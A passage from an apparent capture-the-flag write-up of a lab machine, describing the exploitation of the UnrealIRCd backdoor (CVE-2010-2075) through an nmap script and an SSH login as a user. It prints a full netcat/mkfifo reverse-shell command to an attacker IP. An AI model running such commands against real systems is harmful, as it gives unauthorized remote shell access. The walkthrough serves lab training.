But don't be scared. In this kind of case, the target might be UnrealIRCd just because we rarely see this application.

※Lesson : If you see an open port with reraly seen application, you should enumerate the app because it's not rare that the app is the target.

Because we found rare application, let's google it and check if we can exploit it.

Googling the keyword UnrealIRCd vulnerability revealed the vulnerability numbered CVE-2010-2075. Let's search it deeper.

Foothold

After keep digging, I found interesting page where explains how to exploit backdoor vulnerability. According to this page, we can send arbitrary commad to target machine.

└─$ nmap -d -p8067 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command=' Replace here ' <target_ip>
# I uses code below...
nmap -d -p8067 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f' 10.129.69.182

We got reverse-shell with user ircd.

Again, it doesn't return ssh connection. Actually, if the target machine uses old ssh protocol, it's not rare case that standard ssh command cannot establish conneciton because old ssh version doesn't support latest ssh-public-key. Therefore, we have to indicate public key we use. First, we execute the same command with flag -vvv.

└─$ 
...

Then, let's google the error message. This page told me several debug option. After trying several KexAlgorithm optinos, I found how the way to debug this problem.

└─$ ssh -o MACs=hmac-sha2-256 -i id_rsa djmardov@10.129.69.182
    ※You should remove -vvv options because it display annoying texts even after established conneciton.
djmardov@irked:~$

We got access to the user djmardov.
